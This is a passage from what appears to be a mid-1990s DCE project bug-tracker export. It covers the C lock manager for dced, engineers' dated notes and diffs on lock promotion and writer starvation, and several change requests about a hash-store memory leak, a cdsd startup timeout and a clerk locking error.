        "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS delete WHEN HELD\n",
        file, line, lock, stateNames[ lock->state ], lock->readers));

    }
    dce_assert(dhd_svc_handle, lock->state == lock_state_none);

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug2,
        "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): delete\n",
        file, line, lock, stateNames[ lock->state ], lock->readers));

    pthread_mutex_destroy(&lock->m);
    pthread_cond_destroy(&lock->cv);
    free((char *)lock);

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug2,
        "\nLOCK: 0x%x (--> %s)\n",
        lock, stateNames[ lock_state_nonexistent ]));

    *st = error_status_ok;
}


/*
**  Get a read-lock.
*/
void
dce_lock__read(
    dce_lock_t		lock,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    LOCK_OR_RETURN(lock, st);

    /* Readers have to wait for the writer to finish */
    while (lock->state == lock_state_write) {
	BLOCK_OR_RETURN(lock, st);
    }

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): read\n",
        file, line, lock, stateNames[ lock->state ], lock->readers));

    /* Increment the number of readers. If first reader, set state. */
    lock->readers++;
    if (lock->state == lock_state_none)
	lock->state = lock_state_read;

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\nLOCK: 0x%x (--> %s, nreaders = %d)\n",
        lock, stateNames[ lock->state ], lock->readers));

    UNLOCK_OR_RETURN(lock, st);

    *st = error_status_ok;
}


/*
** Get a read-with-intent-to-write lock.
*/
void
dce_lock__riw(
    dce_lock_t		lock,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    LOCK_OR_RETURN(lock, st);

    /* Readers have to wait for the writer to finish. */
    while (lock->state == lock_state_write || lock->state == lock_state_riw) {
	BLOCK_OR_RETURN(lock, st);
    }

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): riw\n",
        file, line, lock, stateNames[ lock->state ], lock->readers));

    /* Update state. */
    lock->the_writer.file = file;
    lock->the_writer.line = line;
    lock->readers++;
    lock->state = lock_state_riw;
    lock->writer = pthread_self();

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\nLOCK: 0x%x (--> %s, nreaders = %d)\n",
        lock, stateNames[ lock->state ], lock->readers));

    UNLOCK_OR_RETURN(lock, st);

    *st = error_status_ok;
}


void
dce_lock__write(
    dce_lock_t		lock,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    pthread_t		me = pthread_self();

    LOCK_OR_RETURN(lock, st);

    /* One is only allowed to request write lock if one has previously
     * obtained a riw lock!  Note that this requires two tests;
     * 1) Verify that lock state is riw, and
     * 2) Verify that this is in fact the thread that owns the riw.
     */
    if ((lock->state != lock_state_riw) || !pthread_equal(me, lock->writer)) {
        DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
	"\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS write WHEN NOT OWNER\n",
	file, line, lock, stateNames[ lock->state ], lock->readers));
    }
    dce_assert(dhd_svc_handle, ((lock->state == lock_state_riw) && pthread_equal(me, lock->writer)));

    /* Readers and Writers block. The only question here is if the state
     * was RIW and this is the owner of the lock and there are no other 
     * readers, then we can proceed to write. Otherwise we have to wait. */
    while (lock->readers > 1) {
	BLOCK_OR_RETURN(lock, st);
    }

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): write\n",
        file, line, lock, stateNames[ lock->state ], lock->readers));

    /* The last riwer becomes a writer now. */
    lock->readers = 0;
    lock->state = lock_state_write;
    lock->writer = me;
    lock->the_writer.file = file;
    lock->the_writer.line = line;

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\nLOCK: 0x%x (--> %s, nreaders = %d)\n",
        lock, stateNames[ lock->state ], lock->readers));

    UNLOCK_OR_RETURN(lock, st);

    *st = error_status_ok;
}


void
dce_lock__justwrite(
    dce_lock_t		lock,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    error_status_t	st2;

    dce_lock__riw(lock, st, file, line);
    if (*st == error_status_ok) {
	dce_lock__write(lock, st, file, line);
	if (*st != error_status_ok)
	    dce_lock__unlock(lock, &st2, file, line);
    }
}


void
dce_lock__unlock(
    dce_lock_t		lock,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    pthread_t		me = pthread_self();

    LOCK_OR_RETURN(lock, st);

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): unlock\n",
        file, line, lock, stateNames[ lock->state ], lock->readers));

    switch (lock->state) {
    case lock_state_none:
	/* The lock must be held in order to release it! */
	DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
	"\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS unlock WHEN NOT HELD\n",
	file, line, lock, stateNames[ lock->state ], lock->readers));
	dce_assert(dhd_svc_handle, lock->state != lock_state_none);
	/* NOTREACHED */
    case lock_state_read:
	/* Decrement the readers. If zero, then only a writer might be
	 * sleeping on the cv, so wake it up. */
	lock->readers--;
	if (lock->readers == 0) {
	    WAKE_ONE_OR_RETURN(lock, st);
	    lock->state = lock_state_none;
	}
	break;
    case lock_state_riw:
	/* Decrement the readers. If zero, might be another RIW or a W so 
	 * must broadcast. If I was the owner of the lock, then unmark
	 * me and make the RIW lock a R lock. */
	lock->readers--;
	if (lock->readers == 0) {
	    /* If we're not the writer, this is an error! */
	    if (!pthread_equal( me, lock->writer )) {
		DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
		"\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS unlock WHEN NOT RIWER\n",
		file, line, lock, stateNames[ lock->state ], lock->readers));
	    }
	    dce_assert(dhd_svc_handle, pthread_equal( me, lock->writer ));
	    WAKE_ALL_OR_RETURN(lock, st);
	    lock->state = lock_state_none;
	}
	else if (pthread_equal(me, lock->writer)) {
	    lock->state = lock_state_read;
	}
	break;
    case lock_state_write:
	/* Writer resets the lock and wakes up any RIW or R that might be
	 * sleeping. */
	/* If we're not the writer, this is an error! */
	if (!pthread_equal( me, lock->writer )) {
	    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
	    "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS unlock WHEN NOT WRITER\n",
	    file, line, lock, stateNames[ lock->state ], lock->readers));
	}
	dce_assert(dhd_svc_handle, pthread_equal( me, lock->writer ));
	lock->readers = 0;
	lock->state = lock_state_none;
	WAKE_ALL_OR_RETURN(lock, st);
	break;
    }

    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
        "\nLOCK: 0x%x (--> %s, nreaders = %d)\n",
        lock, stateNames[ lock->state ], lock->readers));

    UNLOCK_OR_RETURN(lock, st);

    *st = error_status_ok;
}

void
dce_lock__hold_lock(
    dce_lock_t		lock,
    boolean32		*b,
    error_status_t	*st,
    char		*file,
    int			line
)
{
    *b = FALSE;
    LOCK_OR_RETURN(lock, st);

    switch (lock->state) {
    case lock_state_none:
    case lock_state_read:
	break;
    case lock_state_riw:
    case lock_state_write:
	*b = pthread_equal(pthread_self(), lock->writer);
	break;
    }

    UNLOCK_OR_RETURN(lock, st);

    *st = error_status_ok;
}

[10/6/95]

I tested with Karl's fix, and learned that at least scops.c line 234 calls
for a write lock without having acquired a riw. This causes an assertion
and a core dump of dced. I looked closed at the lock manager, and the best
I can figure The main advantaga of having this intermediate lock, is that in contrast to an
implementation
     * which would allow any read lock to be promoted, this implementation
     * requires that only the name of one special reader (special in that
     * its lock can be promoted) need be remembered (the reader is
remembered
     * in the writer field of the structure).

I am testing a fix that will relax the requirement for a riw befor a write
lock.

[10/17/95]

Karl pointed out that there are related changes in OT 12837 which must be
applied in order for his fix to work. Having applied the changes in 12837,
I made the following changes to Karl's fix for OT 12834. The result is a
lock manager which is able to promote a riw lock to a write lock (which
is desirable functionality for view serializability), but does not require
that a riw lock be acquired before acquiring a write lock. In making these
changes, I also noticed that 

	1. the use of pthread_equal in the lock descision
	making code, was subject to error, since the writer field of the lock
	structure was not being reset. To correct for this potential
	problem, I reinstitued the have_writer mechanism present in Jec's
	original implementation (see THIS_THREAD_IS_WRITER macro).

!!!	see notes [monzillo 10/18/95] this change has been reverted to it's
	original form, and removed form the enclosed diffs.

	2. I removed the dce_lock__justwrite function, and made a
        corresponding change in dce_lock.h such that existing calls
        to dce_lock_justwrite will result in calls to dce_lock__write.
	The future use of justwrite should be discouraged.

*** /project/dce/build/dce1.1/src/admin/dced/server/dce_lock.h  Mon Sep 26
13::19 1994
--- ./dce_lock.h        Mon Oct 16 11:52:00 1995
***************
*** 101,107 ****
  #define dce_lock_write(l,s)   \
        dce_lock__write(l, s, LOCK__FILE__, __LINE__)
  #define dce_lock_justwrite(l,s)       \
!       dce_lock__justwrite(l, s, LOCK__FILE__, __LINE__)
  #define dce_lock_unlock(l,s)  \
        dce_lock__unlock(l, s, LOCK__FILE__, __LINE__)
  #define dce_lock_hold_lock(l,b,s)     \
--- 101,107 ----
  #define dce_lock_write(l,s)   \
        dce_lock__write(l, s, LOCK__FILE__, __LINE__)
  #define dce_lock_justwrite(l,s)       \
!       dce_lock__write(l, s, LOCK__FILE__, __LINE__)
  #define dce_lock_unlock(l,s)  \
        dce_lock__unlock(l, s, LOCK__FILE__, __LINE__)
  #define dce_lock_hold_lock(l,b,s)     \
***************
*** 137,149 ****
  
  extern void dce_lock__write(
      dce_lock_t                        /* lock */,
-     error_status_t*           /* st */,
-     char*                     /* file */,
-     int                               /* line */
- );
- 
- extern void dce_lock__justwrite(
-     dce_lock_t                        /* lock */,
      error_status_t*           /* st */,
      char*                     /* file */,
      int                               /* line */
--- 137,142 ----

	3. In the unlock code for state riw, I noticed that the release
        of a riw lock while there are other readers would miss an opportunity
        to wake a thread waiting for the riw lock.

The following diff was performed against the implementation proposed by
Karl, note that of the 3 problems types of changes listed above, #1 is
by far the most significant. Also the fact that the implementation no
longer requires that a riw be acquired before acquiring a write lock,
should result in some increased efficiency.

!! change 1 was reverted, see notes [monzillo 10/18/95]

In addition to the changes recorded in the following diff, it occurred to
me that the scheduling alogorithm employed by the lock manager is
particularly unfair with respect to writers, such that it would be possible
for a succession of readers to affectively starve any thread wishing to
acquire a write lock. I spent some time trying to set up a test which
would demonstrate such an occurance, but was not able to do so.
I am including a second diff which will eliminate the potential for
writer starvation. In the event that someone else observes the problem,
or devises a test to demonstrate the problem, a fix will be at hand
(see WRITER STARVATION DIFF below).

*** lock.c.ot	Fri Oct  6 16:22:56 1995
--- lock.c.next	Wed Oct 18 12:05:30 1995
***************
*** 307,328 ****
  
      LOCK_OR_RETURN(lock, st);
  
!     /* One is only allowed to request write lock if one has previously
!      * obtained a riw lock!  Note that this requires two tests;
!      * 1) Verify that lock state is riw, and
!      * 2) Verify that this is in fact the thread that owns the riw.
       */
-     if ((lock->state != lock_state_riw) || !pthread_equal(me, lock->writer)) {
-         DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
- 	"\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS write WHEN NOT OWNER\n",
- 	file, line, lock, stateNames[ lock->state ], lock->readers));
-     }
-     dce_assert(dhd_svc_handle, ((lock->state == lock_state_riw) && pthread_equal(me, lock->writer)));
  
!     /* Readers and Writers block. The only question here is if the state
!      * was RIW and this is the owner of the lock and there are no other 
!      * readers, then we can proceed to write. Otherwise we have to wait. */
!     while (lock->readers > 1) {
  	BLOCK_OR_RETURN(lock, st);
      }
  
--- 307,323 ----
  
      LOCK_OR_RETURN(lock, st);
  
!     /* a write lock may only be granted if all of the following are true.
!      * no other thread holds a read lock
!      * no thread holds a write lock (note that allowing the same thread to
!      *          reacquire a write lock will likely lead to problems when the
!      *          lock is released)
!      * no other thread holds a read_intent_to_write lock.
       */
  
!     while (lock->state == lock_state_read || lock->state == lock_state_write ||
! 	(lock->state == lock_state_riw && 
! 	(!pthread_equal(me, lock->writer) || lock->readers > 1))) {
  	BLOCK_OR_RETURN(lock, st);
      }
  
***************
*** 347,370 ****
  }
  
  
- void
- dce_lock__justwrite(
-     dce_lock_t		lock,
-     error_status_t	*st,
-     char		*file,
-     int			line
- )
- {
-     error_status_t	st2;
- 
-     dce_lock__riw(lock, st, file, line);
-     if (*st == error_status_ok) {
- 	dce_lock__write(lock, st, file, line);
- 	if (*st != error_status_ok)
- 	    dce_lock__unlock(lock, &st2, file, line);
-     }
- }
- 
  
  void
  dce_lock__unlock(
--- 342,347 ----
***************
*** 395,423 ****
  	 * sleeping on the cv, so wake it up. */
  	lock->readers--;
  	if (lock->readers == 0) {
- 	    WAKE_ONE_OR_RETURN(lock, st);
  	    lock->state = lock_state_none;
  	}
  	break;
      case lock_state_riw:
! 	/* Decrement the readers. If zero, might be another RIW or a W so 
! 	 * must broadcast. If I was the owner of the lock, then unmark
! 	 * me and make the RIW lock a R lock. */
  	lock->readers--;
! 	if (lock->readers == 0) {
! 	    /* If we're not the writer, this is an error! */
! 	    if (!pthread_equal( me, lock->writer )) {
! 		DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
! 		"\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS unlock WHEN NOT RIWER\n",
! 		file, line, lock, stateNames[ lock->state ], lock->readers));
! 	    }
! 	    dce_assert(dhd_svc_handle, pthread_equal( me, lock->writer ));
! 	    WAKE_ALL_OR_RETURN(lock, st);
! 	    lock->state = lock_state_none;
  	}
! 	else if (pthread_equal(me, lock->writer)) {
! 	    lock->state = lock_state_read;
  	}
  	break;
      case lock_state_write:
  	/* Writer resets the lock and wakes up any RIW or R that might be
--- 372,402 ----
  	 * sleeping on the cv, so wake it up. */
  	lock->readers--;
  	if (lock->readers == 0) {
  	    lock->state = lock_state_none;
+ 	    WAKE_ONE_OR_RETURN(lock, st);
  	}
  	break;
      case lock_state_riw:
! 	/* Decrement the readers. If this thread was the holder of the riw
! 	 * lock, then select the new state according to the number of remaining
!          * readers (wake everybody else up, since this thread might have been
!          * blocking threads waiting for either a riw or a write lock).
!          * Otherwise, there better be at least 1 remaining reader;
!          * the holder of the riw lock.
! 	 */
  	lock->readers--;
! 	if (pthread_equal(me, lock->writer)) {
! 	    if (lock->readers == 0) lock->state = lock_state_none;
! 	    else lock->state = lock_state_read;
  	}
! 	else if (lock->readers == 0) {
!             DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
!             "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS unlock WHEN NOT RIWER\n",
!             file, line, lock, stateNames[ lock->state ], lock->readers));
!             dce_assert(dhd_svc_handle, pthread_equal(lock->writer,me));
!             /* NOTREACHED */
  	}
+ 	WAKE_ALL_OR_RETURN(lock, st);
  	break;
      case lock_state_write:
  	/* Writer resets the lock and wakes up any RIW or R that might be
***************
*** 427,435 ****
  	    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
  	    "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS unlock WHEN NOT WRITER\n",
  	    file, line, lock, stateNames[ lock->state ], lock->readers));
  	}
- 	dce_assert(dhd_svc_handle, pthread_equal( me, lock->writer ));
- 	lock->readers = 0;
  	lock->state = lock_state_none;
  	WAKE_ALL_OR_RETURN(lock, st);
  	break;
--- 406,413 ----
  	    DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug1,
  	    "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): ERRONEOUS unlock WHEN NOT WRITER\n",
  	    file, line, lock, stateNames[ lock->state ], lock->readers));
+ 	    dce_assert(dhd_svc_handle, pthread_equal( me, lock->writer ));
  	}
  	lock->state = lock_state_none;
  	WAKE_ALL_OR_RETURN(lock, st);
  	break;

WRITER STARVATION DIFF:

*** lock.c.next	Wed Oct 18 12:05:30 1995
--- lock.c.fix	Wed Oct 18 12:31:24 1995
***************
*** 89,94 ****
--- 89,96 ----
      pthread_mutex_t	m;
      pthread_cond_t	cv;
      int			readers;
+     unsigned32		short_cutting_readers;
+     unsigned32		waiting_writers;
      enum {
  	lock_state_nonexistent=0, lock_state_none, lock_state_read, lock_state_riw, lock_state_write
      }			state;
***************
*** 134,140 ****
--- 136,154 ----
  	 return; \
      }
  
+ /*
+ **  fairness threshold, the number of readers which may
+ **  short cut a waiting writer. This limit exists to insure that
+ **  in a highly utilized system, readers are not able to starve
+ **  (prevent them from ever acquiring the lock) out writers.
+ */
+ #define MAXIMUM_SHORT_CUTTING_READERS 9
  
+ #define FAIRNESS_THRESHOLD \
+     (lock->waiting_writers > 0 ? \
+        (MAXIMUM_SHORT_CUTTING_READERS + lock->waiting_writers)/ \
+         lock->waiting_writers : MAXIMUM_SHORT_CUTTING_READERS)
+ 
  /*
  **  Create a lock.
  */
***************
*** 170,175 ****
--- 184,191 ----
  	file, line, new, stateNames[ lock_state_nonexistent ]));
  
      new->readers = 0;
+     new->short_cutting_readers = 0;
+     new->waiting_writers = 0;
      new->state = lock_state_none;
      new->the_creator.file = file;
      new->the_creator.line = line;
***************
*** 230,246 ****
      int			line
  )
  {
      LOCK_OR_RETURN(lock, st);
  
!     /* Readers have to wait for the writer to finish */
!     while (lock->state == lock_state_write) {
! 	BLOCK_OR_RETURN(lock, st);
      }
  
!     DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
!         "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): read\n",
!         file, line, lock, stateNames[ lock->state ], lock->readers));
  
      /* Increment the number of readers. If first reader, set state. */
      lock->readers++;
      if (lock->state == lock_state_none)
--- 246,277 ----
      int			line
  )
  {
+     boolean32		delayed = FALSE;
+ 
      LOCK_OR_RETURN(lock, st);
  
!     /* Readers have to wait for the writer to finish, and should defer
!      * at some threshold to waiting writers to avoid writer starvation.
!      * This fairness policy is simply intended to eliminate the potential
!      * for readers to starve out writers. It will only come into play when
!      * readers are jumping in front of waiting writers. Once the threshold
!      * is reached, a writer will be the next to get the lock. After that
!      * the short cut counter is reset (see dce_lock_write).
!      */
! 
!     while (lock->state == lock_state_write || 
!         lock->short_cutting_readers > FAIRNESS_THRESHOLD) {
!         delayed = TRUE;
!         BLOCK_OR_RETURN(lock, st);
      }
  
!     if (!delayed && lock->waiting_writers > 0) lock->short_cutting_readers++;
  
+     DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
+ 	"\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d, cutters = %d): read\n",
+ 	file, line, lock, stateNames[ lock->state ], lock->readers,
+ 	lock->short_cutting_readers));
+  
      /* Increment the number of readers. If first reader, set state. */
      lock->readers++;
      if (lock->state == lock_state_none)
***************
*** 267,279 ****
      int			line
  )
  {
      LOCK_OR_RETURN(lock, st);
  
!     /* Readers have to wait for the writer to finish. */
!     while (lock->state == lock_state_write || lock->state == lock_state_riw) {
! 	BLOCK_OR_RETURN(lock, st);
      }
  
      DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
          "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): riw\n",
          file, line, lock, stateNames[ lock->state ], lock->readers));
--- 298,327 ----
      int			line
  )
  {
+     boolean32		delayed = FALSE;
+ 
      LOCK_OR_RETURN(lock, st);
  
!     /* At most one thread is allowed to hold a read-intent-to-write lock,
!      * and only when no other thread already holds a write lock.
!      * Note that this is the only kind of read lock which can subsequently
!      * be promoted to a write lock, but that does not mean that you need to
!      * acquire a riw lock in order to get a write lock. The main advantage
!      * of having this intermediate lock, is that in contrast to an implementation
!      * which would allow any read lock to be promoted, this implementation
!      * requires that only the name of one special reader (special in that
!      * its lock can be promoted) need be remembered (the reader is remembered
!      * in the writer field of the structure).
!      */
!    
!     while (lock->state == lock_state_write || lock->state == lock_state_riw ||
!         lock->short_cutting_readers > FAIRNESS_THRESHOLD) {
!         delayed = TRUE;
!         BLOCK_OR_RETURN(lock, st);
      }
  
+     if (!delayed && lock->waiting_writers > 0) lock->short_cutting_readers++;
+ 
      DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
          "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): riw\n",
          file, line, lock, stateNames[ lock->state ], lock->readers));
***************
*** 315,326 ****
--- 363,379 ----
       * no other thread holds a read_intent_to_write lock.
       */
  
+     lock->waiting_writers++;
+ 
      while (lock->state == lock_state_read || lock->state == lock_state_write ||
  	(lock->state == lock_state_riw && 
  	(!pthread_equal(me, lock->writer) || lock->readers > 1))) {
  	BLOCK_OR_RETURN(lock, st);
      }
  
+     lock->waiting_writers--;
+     lock->short_cutting_readers = 0;
+   
      DCE_SVC_DEBUG((dhd_svc_handle, dhd_s_lock, svc_c_debug3,
          "\n%s:%d\nLOCK: 0x%x (%s, nreaders = %d): write\n",
          file, line, lock, stateNames[ lock->state ], lock->readers));
***************
*** 368,379 ****
  	dce_assert(dhd_svc_handle, lock->state != lock_state_none);
  	/* NOTREACHED */
      case lock_state_read:
! 	/* Decrement the readers. If zero, then only a writer might be
! 	 * sleeping on the cv, so wake it up. */
  	lock->readers--;
  	if (lock->readers == 0) {
  	    lock->state = lock_state_none;
! 	    WAKE_ONE_OR_RETURN(lock, st);
  	}
  	break;
      case lock_state_riw:
--- 421,434 ----
  	dce_assert(dhd_svc_handle, lock->state != lock_state_none);
  	/* NOTREACHED */
      case lock_state_read:
!       /* Decrement the readers. If zero, then wake everybody up.
!        * Note that both readers and writers may be waiting (based on
!        * fairness algorithm).
!        */
  	lock->readers--;
  	if (lock->readers == 0) {
  	    lock->state = lock_state_none;
! 	    WAKE_ALL_OR_RETURN(lock, st);
  	}
  	break;
      case lock_state_riw:

[10/18/95]

The problem reported above as follows, was at least overstated.
I will correct the diff to remove the have_writer change.

	1. the use of pthread_equal in the lock descision
	making code, was subject to error, since the writer field of the lock
	structure was not being reset. To correct for this potential
	problem, I reinstitued the have_writer mechanism present in Jec's
	original implementation (see THIS_THREAD_IS_WRITER macro).

[10/18/95]

the preceeding diffs have been corrected.



CR Number                     : 12831
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 12830
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : db44
Short Description             : Hash code doesn't replace data with same key
Reported Date                 : 3/29/95
Found in Baseline             : 1.1
Found Date                    : 3/29/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : hash.c
Sensitivity                   : public

[3/29/95 public]

If an identical data element with the same key value is stored in
a backing store of type "bsd4.4-btree", there is (as expected) no
growth in the size of the backing store.  However, if the same is
attempted with a backing store of type "bsd4.4-hash", there _is_
growth--of unpredictable dimensions--of the backing store.  IBM
has provided a test case which demonstrates this phenomenon.

As in CR 12830, the culprit appears to be __hash_open (in hash.c) 
and/or one of the functions it hooks into the DB structure when 
it is called.


Is there any status on this OT?

[08/10/95 public]
See my update in OTCR 12831.  Same thing applies here.

[02/6/96 public]
Rich probably meant 12830.



CR Number                     : 12830
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : db44
Short Description             : Memory leak in hash code
Reported Date                 : 3/29/95
Found in Baseline             : 1.1
Found Date                    : 3/29/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : hash.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/29/95 public]

Repeatedly fetching a specific data element from a backing store of type
"bsd4.4-hash" causes the process size to grow by the amount of data
retrieved, even though rpc_sm_enable_allocate has previously been called
and the pointers to this data are nominally (but, in reality, not) being
deallocated with rpc_sm_free.  There is also some associated growth in
the backing store.  IBM has provided a test case which demonstrates these
phenomena.

As this does not occur when the backing store is of type "bsd4.4-btree",
the culprit appears to be __hash_open (in hash.c) and/or one of the
functions it hooks into the DB structure when it is called.

[3/29/95 public]

Fixed typo.

Is there any status on this OT?

[08/10/95 public]
I have been in touch with the folks at Berkeley who maintain the DB
package.  I gave them the sample code (which, as it is DCE code isn't
very useful to them).  They say the following info would help.  Write
a small program to read in the DB file header (see the dbheader struct
in the src/utils/db44 directory) and print it out and post the values,
they want the fill factor and page size.

But they're trying to reproduce the problem and will be in touch with me.

[7/19/96 public]
Any word from folks at Berkeley? Can someone post the tests here (from IBM?)?

[07/19/96 public]
You could drop a line to margo@eecs.harvard.edu; tell her I sent you.

[07/19/96 public]
I have lost the testcases I had in a machine crash.  I had sent them 
to the OSF.  I contacted BSDI and they gave me a new version of the
DB code that was not compatible with the version that the OSF was 
using so I could not pull fixes out of it.

[7/19/96 public]



CR Number                     : 12827
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 2854
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : New namespace cannot be reached: status = DNS_SOCKET.
Reported Date                 : 3/27/95
Found in Baseline             : 1.1
Found Date                    : 3/27/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : dns_service_ncl.c
Sensitivity                   : public

[3/27/95 public]

 Cdsd is dying sometimes during startup because it's timing out when 
 trying to read the root directory.
 
 S:****** Configuring initial CDS Server...
 S:****** Please wait for user authentication and authorization...
 
 
 S:****** Checking for active sec_client service...
 
 
         If clients and servers are to be divided into LAN profile
         groups to facilitate performance, enter "y" to the
         following question.
         (Most cells will not require this feature.)
  
         Are you using multiple LAN profiles within this cell? (n) 
 S:****** Starting cdsadv...
 S:****** Starting cdsd...
 1995-02-01-15:43:59.058-05:00I----- cdsd(4466) FATAL cds server
 dns_service_ncl.c 327 0x24033f88
 New namespace cannot be reached: status = DNS_SOCKET.

Proposed Solution:

Customet increased probe interval from 1 to 3 seconds, and no longer
encountered problem (cdsd tries 15 times waiting 3 seconds between
each try).

     *** /tmp/ci.13822..dns_service_ncl.c.13854.1       Fri Feb  3 16:39:49
1995
     --- /tmp/dns_service_ncl.c.13854.2 Fri Feb  3 16:39:50 1995
     ***************
     *** 769,779 ****
        * error is returned.
        * Inputs:  nameserver nsgbl_ch structure
        * Returns: dns_status_t
       */
       #define NUM_ATTEMPTS 15   /* number of attempts to read root    */
     ! #define PROBE_INTERVAL 1  /* interval, in secs., between reads  */
       
       static dns_status_t 
       probe_root_dir (nsgbl_ch_t *ch_p)
       {
           DEB_ASCII_BUF_nsgbl_ch(chBuf)
     --- 773,783 ----
        * error is returned.
        * Inputs:  nameserver nsgbl_ch structure
        * Returns: dns_status_t
       */
       #define NUM_ATTEMPTS 15   /* number of attempts to read root    */
     ! #define PROBE_INTERVAL 3  /* interval, in secs., between reads  */
       
       static dns_status_t 
       probe_root_dir (nsgbl_ch_t *ch_p)
       {
           DEB_ASCII_BUF_nsgbl_ch(chBuf)



CR Number                     : 12825
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cds_clerk
Short Description             : locking error in cancellation code
Reported Date                 : 3/27/95
Found in Baseline             : 1.1
Found Date                    : 3/27/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/27/95 public]

                          DCE Problem Report
                  =================================


Submitter Information 
----------------------

Submitter Name:           wright
Organization:             Hitachi Computer Products (America), Inc. 
Email Address:            osd.dce@hi.com wright@hi.com 
Phone:                    617-890-0444 
DCE License Number:       1616-MDCE-92
Licensee's Defect Number: OSDqa10355


Hardware/Software Configuration
--------------------------------

Offering and Version:   DCE7.2 
Component (Module):     clerk_client.c 
Client Hardware:        see below 
Client Software:        see below 
Server Hardware:        see below 
Server Software:        see below 
Compiler:               n/a

Problem Description
--------------------

Severity Level: Critical

Date of First Occurrence: 01/11/95

One Line Description:
   OSDqa10355 locking error in cancellation code

Full Description:

Related-file:::: Problem
 DESCRIPTION:  In directory/cds/child/clerk_client.c, the link_free
 procedure does not hold a lock long enough.  Specifically, when it
 sets its state to ll_Off and broadcasts to ll_state_changed, it should
 still be holding the ll_mutex.
 
 
 REPRODUCIBLE:  Occasionally.
 
 
Related-file::Added 950111 by wright:: /build/hiosfm/RCS/dce1.1/src/directory/cds/child/./clerk_client.c,v 7.3
 /build/hiosfm/RCS/dce1.1/src/directory/cds/child/./clerk_client.c,v 7.3
 wright 1995/01/11 17:40:34 +9 -14
 Reason:  OSDqa10355 locking error in cancellation code
 Hold the ll_mutex while issuing the broadcast on state_changed.
 
     *** /tmp/ci.2882..clerk_client.c.2918.1	Wed Jan 11 12:40:37 1995
     --- /tmp/clerk_client.c.2918.2	Wed Jan 11 12:40:37 1995
     ***************
